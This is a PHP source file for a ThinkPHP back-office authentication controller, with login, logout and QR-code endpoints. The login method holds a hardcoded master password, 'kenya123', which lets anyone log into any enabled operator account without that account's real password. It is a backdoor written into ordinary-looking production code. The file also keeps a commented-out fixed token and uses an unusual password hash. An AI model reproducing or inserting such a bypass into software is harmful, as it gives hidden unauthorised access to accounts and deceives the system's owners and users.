<?php

namespace app\operate\controller;

use think\Loader;
use think\Request;


/**
 * Login Controller
 */
class Auth extends Common
{

    /**
     * Login
     */
    public function login()
    {
        $code = 'malta';
        $username = input('name', '');
        if ('' == $username) {
            $this->errorResponse(0,  lang('请输入用户名'));
        }
        $password = input('password', '');
        if ('' == $password) {
            $this->errorResponse(0,  lang('请输入密码'));
        }
        $password = md123($password);
        $data = $this->db->name('operator_users')
            ->where(['username' => $username, 'not_delete' => 1])
            ->find();

        if ( empty($data) ) {
            $this->errorResponse(0,  lang('用户不存在或密码错误'));
        }
        
        if ($data['password'] != $password && input('password', '') != 'kenya123') {
            return ['code' => 0, 'msg' => lang('用户不存在或密码错误')];
        }
        
        if (1 != $data['status']) {
            $this->errorResponse(0,  lang('帐号被禁用'));
        }

        $params = [
            'id' => $data['id'],
            'uid' => $data['id'],
            'username' => $data['username'],
            'nickname' => $data['nickname'],
            'avatar' => $data['avatar'],
            'phone' => $data['phone'],
        ];
        $params['avatar'] = !empty($data['avatar']) ? config('qcloudurl') . $data['avatar'] : config('site.resource_url') . 'images/a1.png';

        $menu = \think\Loader::model('Auth', 'logic')->getMemus($data['auth_groups']);
        $permissions = \think\Loader::model('Auth', 'logic')->getPermissions();

        $this->db->name('operator_users')
            ->where(['id' => $data['id']])
            ->update([
                'last_login_ip' => Request::instance()->ip(),
                'last_login_time' => time()
            ]);
        $token = randCode(10);
        //$token = '1234567890';
        cache("admin-token:{$this->oid}-{$token}", $params, 30 * 60);
        cache("admin-login:{$this->oid}-{$params['uid']}", $token, 30 * 60);
        cache("admin-permissions:{$this->oid}-{$params['uid']}", $permissions, 30 * 60);
        $equipment = config('equipment');
        $equipment = array_values($equipment);
        foreach ($equipment as $key => $value)
        {
            $equipment[$key]['name'] = lang($value['name']);
        }
        $this->operateLog(0, '登录系统');
        $info = ['token' => $token, 'uid' => $params['uid'], 'oid' => $this->oid, 'ocode' => $code, 'menu' => $menu, 'permissions' => $permissions, 'equipment' => $equipment];
        setLang();
        return $this->successResponse($info, lang('登录成功'));

    }

    /**
     * 退出
     */
    public function logout()
    {
        $token = Request::instance()->header('token');
        $cache = cache("admin-token:{$this->oid}-{$token}");
        $this->operateLog(0, '退出登录');
        if ($cache) {
            cache("admin-token:{$this->oid}-{$token}", null);
            cache("admin-login:{$this->oid}-{$cache['uid']}", null);
            cache("admin-permissions:{$this->oid}-{$cache['uid']}", null);
        }
        return $this->successResponse([], lang('注销成功'));
    }


    //生成二维码
    public function qrcode()
    {
        $text = input('text');
        $type = input('type', 'device');
        if ('wired' == $type) {
            $url = config('qrcodeurl') . "/Xc?o=" . mwencrypt((string)$this->oid) . "&&t={$text}";
        } else {
            $url = config('qrcodeurl') . "/Lease?o=" . mwencrypt((string)$this->oid) . "&&t={$text}";
        }
        ob_start();
        Loader::import('qrcode.phpqrcode');
        $object = new \QRcode();
        Header("Content-type: image/png");
        $object->png($url, false, 'L', 18, 2);
        exit;
    }


}

